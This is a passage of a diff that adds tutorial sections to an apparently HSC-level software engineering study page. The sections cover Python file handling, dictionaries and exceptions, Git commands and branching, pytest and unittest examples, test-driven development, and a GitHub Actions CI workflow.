+            <pre><code># Writing to a file
+with open("scores.txt", "w") as f:
+    for score in scores:
+        f.write(str(score) + "\n")
+
+# Reading from a file
+with open("scores.txt", "r") as f:
+    for line in f:
+        value = int(line.strip())   # strip() removes trailing newline
+        print(value)
+
+# Appending to an existing file
+with open("scores.txt", "a") as f:
+    f.write("99\n")</code></pre>
+          </div>
+
+          <h3>Dictionaries</h3>
+          <div class="code-block">
+            <div class="code-header"><span class="code-lang">Python</span></div>
+            <pre><code># Dictionary stores key-value pairs
+student = {
+    "name": "Alice",
+    "age": 17,
+    "score": 87.5
+}
+
+# Access and update
+print(student["name"])          # Alice
+student["score"] = 92.0         # Update value
+student["subject"] = "SoftEng" # Add new key
+
+# Iterate over key-value pairs
+for key, value in student.items():
+    print(f"{key}: {value}")</code></pre>
+          </div>
+
+          <h3>Exception Handling</h3>
+          <div class="code-block">
+            <div class="code-header"><span class="code-lang">Python — try / except</span></div>
+            <pre><code># Basic exception handling — prevent a crash on bad input
+try:
+    age = int(input("Enter your age: "))
+    print(f"In 10 years you will be {age + 10}")
+except ValueError:
+    print("Error: please enter a whole number.")
+
+# Handle multiple exception types
+try:
+    with open("data.txt", "r") as f:
+        data = f.read()
+    number = int(data.strip())
+    result = 100 / number
+    print(f"Result: {result}")
+except FileNotFoundError:
+    print("Error: data.txt not found.")
+except ValueError:
+    print("Error: file does not contain a valid integer.")
+except ZeroDivisionError:
+    print("Error: cannot divide by zero.")
+finally:
+    print("Processing complete.")   # Runs whether exception occurred or not</code></pre>
+          </div>
+          <div class="callout info">
+            <strong>When to use try/except:</strong> Wrap code that interacts with the outside world — user input, file I/O, network calls, and type conversions — since these can fail for reasons beyond your control. Do <em>not</em> use exceptions to control normal program flow; use IF/ELSE for expected conditions.
+          </div>
+        </section>
+
+        <hr class="divider" />
+
+        <!-- 14. Git & Version Control Workflow -->
+        <section id="git-workflow">
+          <h2 class="syllabus-phase">🔀 Git &amp; Version Control Workflow</h2>
+          <p>Git is a distributed version control system that tracks every change to your code. Every commit is a snapshot — you can revert to any previous state, compare versions, and collaborate without overwriting each other's work.</p>
+
+          <h3>Core Git Commands Reference</h3>
+          <div class="table-wrap">
+            <table>
+              <thead>
+                <tr><th>Command</th><th>What It Does</th><th>Example</th></tr>
+              </thead>
+              <tbody>
+                <tr><td><code>git init</code></td><td>Initialise a new empty repository</td><td><code>git init myproject</code></td></tr>
+                <tr><td><code>git clone</code></td><td>Copy a remote repository to your machine</td><td><code>git clone https://github.com/user/repo.git</code></td></tr>
+                <tr><td><code>git status</code></td><td>Show which files are changed, staged, or untracked</td><td><code>git status</code></td></tr>
+                <tr><td><code>git add</code></td><td>Stage changes for the next commit</td><td><code>git add app.py</code> or <code>git add .</code></td></tr>
+                <tr><td><code>git commit</code></td><td>Save staged changes as a commit with a message</td><td><code>git commit -m "Add login feature"</code></td></tr>
+                <tr><td><code>git push</code></td><td>Upload local commits to the remote repository</td><td><code>git push origin main</code></td></tr>
+                <tr><td><code>git pull</code></td><td>Download and merge remote changes</td><td><code>git pull origin main</code></td></tr>
+                <tr><td><code>git fetch</code></td><td>Download remote changes without merging</td><td><code>git fetch origin</code></td></tr>
+                <tr><td><code>git branch</code></td><td>List, create, or delete branches</td><td><code>git branch feature/login</code></td></tr>
+                <tr><td><code>git checkout</code></td><td>Switch branches or restore files</td><td><code>git checkout feature/login</code></td></tr>
+                <tr><td><code>git switch</code></td><td>Switch branches (modern alternative to checkout)</td><td><code>git switch -c feature/login</code></td></tr>
+                <tr><td><code>git merge</code></td><td>Merge a branch into the current branch</td><td><code>git merge feature/login</code></td></tr>
+                <tr><td><code>git log</code></td><td>Show commit history</td><td><code>git log --oneline --graph</code></td></tr>
+                <tr><td><code>git diff</code></td><td>Show unstaged changes</td><td><code>git diff app.py</code></td></tr>
+                <tr><td><code>git stash</code></td><td>Temporarily save uncommitted changes</td><td><code>git stash pop</code></td></tr>
+                <tr><td><code>git tag</code></td><td>Create a labelled reference to a commit</td><td><code>git tag v1.0.0</code></td></tr>
+                <tr><td><code>git reset</code></td><td>Undo commits (use with caution!)</td><td><code>git reset --soft HEAD~1</code></td></tr>
+                <tr><td><code>git revert</code></td><td>Create a new commit that undoes a previous one (safe)</td><td><code>git revert abc1234</code></td></tr>
+                <tr><td><code>git remote</code></td><td>Manage remote repository connections</td><td><code>git remote -v</code></td></tr>
+                <tr><td><code>git rm</code></td><td>Remove a file from the repository and staging</td><td><code>git rm old_file.py</code></td></tr>
+              </tbody>
+            </table>
+          </div>
+
+          <h3>Feature Branch Workflow</h3>
+          <pre class="text-diagram">Feature Branch Workflow
+──────────────────────────────────────────────────────────────
+main ──●──────────────────────────────────●── stable/deployable
+        \                                /
+         ● feature/login                ← merged via Pull Request
+          \                            /
+           ●──●──●  (develop here)   ●── all tests pass
+──────────────────────────────────────────────────────────────
+Steps:
+1. git switch -c feature/login      ← create feature branch
+2. write code, git add, git commit  ← develop and commit
+3. git push origin feature/login    ← push to remote
+4. Open Pull Request on GitHub      ← request code review
+5. Peer reviews → approves          ← quality gate
+6. Merge into main                  ← integrated and deployed
+7. git branch -d feature/login      ← clean up</pre>
+
+          <div class="code-block">
+            <div class="code-header"><span class="code-lang">Bash — Complete Feature Branch Workflow</span></div>
+            <pre><code># Start from an up-to-date main branch
+git switch main
+git pull origin main
+
+# Create and switch to a new feature branch
+git switch -c feature/student-search
+
+# ... write code ...
+
+# Stage and commit changes
+git add search.py templates/search.html
+git commit -m "Add student search by name and ID"
+
+# Push branch to remote
+git push -u origin feature/student-search
+
+# After PR is reviewed and approved:
+git switch main
+git pull origin main
+git merge feature/student-search
+git push origin main
+
+# Clean up
+git branch -d feature/student-search</code></pre>
+          </div>
+
+          <h3>Example .gitignore for Python Projects</h3>
+          <div class="code-block">
+            <div class="code-header"><span class="code-lang">.gitignore — Python project</span></div>
+            <pre><code># Virtual environments
+venv/
+.venv/
+env/
+
+# Python bytecode
+__pycache__/
+*.pyc
+*.pyo
+
+# Environment variables (NEVER commit secrets)
+.env
+.env.local
+secrets.json
+
+# IDE files
+.vscode/
+.idea/
+*.swp
+
+# Test coverage reports
+.coverage
+htmlcov/
+
+# Build outputs
+dist/
+build/
+*.egg-info/</code></pre>
+          </div>
+
+          <div class="callout info">
+            <strong>Good Commit Message Guide:</strong><br>
+            ✓ Use imperative mood: "Add login page" not "Added login page"<br>
+            ✓ Keep subject line under 50 characters<br>
+            ✓ Explain <em>why</em> the change was made, not just what<br>
+            ✓ Reference related issue numbers: "Fix input validation (closes #12)"<br>
+            ✗ Don't write: "fix", "wip", "changes", "update stuff"
+          </div>
+        </section>
+
+        <hr class="divider" />
+
+        <!-- 15. Testing Frameworks -->
+        <section id="testing-frameworks">
+          <h2 class="syllabus-phase">🧪 Testing Frameworks</h2>
+          <p>Python has two primary testing frameworks. Both allow you to write automated tests that verify your code behaves correctly — automatically, every time you make a change.</p>
+
+          <h3>unittest — Built-in Python Testing</h3>
+          <div class="code-block">
+            <div class="code-header"><span class="code-lang">Python — unittest example with setUp</span></div>
+            <pre><code>import unittest
+from bank_account import BankAccount   # the module we're testing
+
+class TestBankAccount(unittest.TestCase):
+
+    def setUp(self):
+        """Runs before each test method — creates fresh test data."""
+        self.account = BankAccount("Alice", 1000)
+
+    def tearDown(self):
+        """Runs after each test method — clean up if needed."""
+        pass
+
+    def test_initial_balance(self):
+        self.assertEqual(self.account.balance, 1000)
+
+    def test_deposit_increases_balance(self):
+        self.account.deposit(500)
+        self.assertEqual(self.account.balance, 1500)
+
+    def test_withdraw_decreases_balance(self):
+        self.account.withdraw(200)
+        self.assertEqual(self.account.balance, 800)
+
+    def test_withdraw_insufficient_funds_raises_error(self):
+        with self.assertRaises(ValueError):
+            self.account.withdraw(9999)
+
+    def test_deposit_negative_raises_error(self):
+        with self.assertRaises(ValueError):
+            self.account.deposit(-50)
+
+    def test_balance_cannot_go_negative(self):
+        self.account.withdraw(1000)
+        self.assertGreaterEqual(self.account.balance, 0)
+
+if __name__ == '__main__':
+    unittest.main(verbosity=2)</code></pre>
+          </div>
+
+          <h3>pytest — Modern Python Testing</h3>
+          <p>pytest is simpler to write and provides more detailed failure output than unittest. Tests are just functions prefixed with <code>test_</code>.</p>
+          <div class="code-block">
+            <div class="code-header"><span class="code-lang">Python — pytest with fixture and parametrize</span></div>
+            <pre><code>import pytest
+from bank_account import BankAccount
+
+@pytest.fixture
+def account():
+    """pytest fixture — creates a BankAccount for each test."""
+    return BankAccount("Bob", 500)
+
+def test_deposit(account):
+    account.deposit(100)
+    assert account.balance == 600
+
+def test_withdraw(account):
+    account.withdraw(200)
+    assert account.balance == 300
+
+# Parametrize: run same test with multiple inputs
+@pytest.mark.parametrize("amount,expected", [
+    (100, 600),
+    (500, 1000),
+    (0.01, 500.01),
+])
+def test_deposit_parametrized(account, amount, expected):
+    account.deposit(amount)
+    assert account.balance == pytest.approx(expected)</code></pre>
+          </div>
+
+          <h3>unittest vs pytest Comparison</h3>
+          <div class="table-wrap">
+            <table>
+              <thead>
+                <tr><th>Feature</th><th>unittest</th><th>pytest</th></tr>
+              </thead>
+              <tbody>
+                <tr><td>Syntax</td><td>Class-based, verbose</td><td>Function-based, minimal</td></tr>
+                <tr><td>Built into Python?</td><td>Yes</td><td>No — requires <code>pip install pytest</code></td></tr>
+                <tr><td>Failure output</td><td>Basic</td><td>Detailed diff with variable values</td></tr>
+                <tr><td>Fixtures</td><td><code>setUp</code>/<code>tearDown</code></td><td><code>@pytest.fixture</code> — more flexible</td></tr>
+                <tr><td>Parametrised tests</td><td>Requires subTest or loops</td><td><code>@pytest.mark.parametrize</code></td></tr>
+                <tr><td>HSC recommendation</td><td>Fine for simple projects</td><td>Preferred for clean, readable tests</td></tr>
+              </tbody>
+            </table>
+          </div>
+
+          <h3>TDD — Test-Driven Development</h3>
+          <pre class="text-diagram">TDD Cycle: Red → Green → Refactor
+──────────────────────────────────────────
+🔴 RED      Write a failing test FIRST
+            (the feature doesn't exist yet — test must fail)
+      ↓
+🟢 GREEN    Write the minimum code to make the test pass
+            (don't over-engineer — just make it pass)
+      ↓
+🔵 REFACTOR Improve the code's design without changing behaviour
+            (tests still pass — they protect against regressions)
+      ↓
+  Repeat for the next feature
+──────────────────────────────────────────</pre>
+
+          <div class="callout info">
+            <strong>Code Coverage:</strong> Run <code>coverage run -m pytest</code> then <code>coverage report</code> to see what percentage of your code is executed by tests. Aim for &gt;80% coverage. Missing lines shown with <code>coverage html</code> → open <code>htmlcov/index.html</code>.
+          </div>
+        </section>
+
+        <hr class="divider" />
+
+        <!-- 16. CI/CD -->
+        <section id="cicd">
+          <h2 class="syllabus-phase">⚙️ CI/CD — Continuous Integration &amp; Deployment</h2>
+          <p><strong>CI/CD</strong> automates the build, test, and deployment pipeline. Every time code is pushed, the pipeline runs automatically — catching bugs before they reach production.</p>
+
+          <div class="key-terms">
+            <div class="key-term-item"><strong>Continuous Integration (CI)</strong><span>Automatically build and test code on every push. If any test fails, the team is immediately notified. Prevents "works on my machine" problems by testing on a fresh, consistent environment.</span></div>
+            <div class="key-term-item"><strong>Continuous Deployment (CD)</strong><span>Automatically deploy code to production (or staging) when all tests pass. The pipeline handles build, test, and deploy without manual steps.</span></div>
+          </div>
+
+          <h3>GitHub Actions — Automated Testing on Push</h3>
+          <div class="code-block">
+            <div class="code-header"><span class="code-lang">YAML — .github/workflows/tests.yml</span></div>
+            <pre><code>name: Run Tests
+
+on:
+  push:
+    branches: [ main, develop ]
+  pull_request:
+    branches: [ main ]
+
+jobs:
+  test:
+    runs-on: ubuntu-latest
+
+    steps:
+    - name: Check out code
+      uses: actions/checkout@v4
+
+    - name: Set up Python 3.11
+      uses: actions/setup-python@v4
+      with:
+        python-version: '3.11'
+
+    - name: Install dependencies
+      run: |
+        python -m pip install --upgrade pip
+        pip install -r requirements.txt
+        pip install pytest coverage
+
+    - name: Run tests with coverage
+      run: |
+        coverage run -m pytest tests/ -v
+        coverage report --fail-under=80</code></pre>
+          </div>
+
+          <div class="callout info">
+            <strong>CI/CD Benefits for HSC Projects:</strong><br>
+            Even for solo HSC projects, a CI pipeline adds value — every push is automatically tested, so you always know whether your changes broke anything. It also demonstrates professional development practice in your folio documentation.
+          </div>
         </section>
 
         <div class="callout success">
